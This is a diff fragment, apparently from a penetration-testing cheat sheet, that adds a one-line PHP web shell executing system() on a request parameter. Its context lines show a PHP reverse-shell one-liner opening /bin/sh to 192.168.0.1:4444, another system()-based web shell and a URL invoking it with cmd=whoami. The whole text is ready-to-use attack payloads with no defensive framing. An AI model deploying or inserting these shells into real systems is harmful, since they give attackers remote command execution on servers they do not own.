@@ -397,6 +397,11 @@ php -r '$sock=fsockopen("192.168.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 <?php echo system($_REQUEST["cmd"]); ?>
 ```
 
+## coyote PHP command shell
+```
+<?php system($_REQUEST[0]); ?>
+```
+
 ## Call the CMD shell:
 
 http://192.168.0.1/cmd_shell.php?cmd=whoami
